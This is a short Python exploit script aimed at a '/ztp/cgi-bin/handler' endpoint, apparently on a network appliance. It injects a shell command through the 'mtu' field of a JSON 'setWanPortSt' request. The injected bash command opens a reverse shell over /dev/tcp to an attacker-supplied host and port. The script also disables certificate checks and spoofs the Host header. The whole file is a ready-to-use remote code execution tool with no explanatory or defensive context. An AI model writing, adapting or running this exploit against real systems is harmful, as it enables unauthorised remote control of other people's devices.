#!/usr/bin/env python3

import argparse, requests, urllib3
from termcolor import colored
import concurrent.futures
urllib3.disable_warnings()

version = 0.1

def exploit(target, localhost, localport):

    try:

        url = f'{target}/ztp/cgi-bin/handler'
        headers = {
            'Host': '127.0.0.1',
            'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:59.0) Gecko/20100101 Firefox/59.0',
            'Content-Type': 'application/json'
        }

        payload = ";bash -c 'exec bash -i &>/dev/tcp/" + localhost + '/' + str(localport) + " <&1';"
        json = {
          'command': 'setWanPortSt',
          'proto': 'dhcp',
          'port': '4',
          'vlan_tagged': '1',
          'vlanid': '5',
          'mtu': payload,
          'data':'request'
        }
        

        r = requests.post(url, headers=headers, json=json, verify=False, timeout=5)
        
    except Exception as e:
        print(colored(e, "yellow", attrs=['bold']))

def banner():

    ## version
    print(colored("version {}" .format(version), "green", attrs=['bold']))

if __name__ == "__main__":

    # version
    banner()

    ## parse argument
    parser = argparse.ArgumentParser()
    parser.add_argument('-t', '--target', help='IP address of the target, eg: https://127.0.0.1:9443', default=False)
    parser.add_argument('-lhost', '--localhost', help='IP address for reverse shell, eg: 127.0.0.1', default='127.0.0.1')
    parser.add_argument('-lport', '--localport', type=int, help='Port number for reverse shell, eg: 1337', default=1337)
    args = parser.parse_args()

    if args.target is not False:
        
        exploit(args.target, args.localhost, args.localport) 
    
    else:

        parser.print_help()
        parser.exit()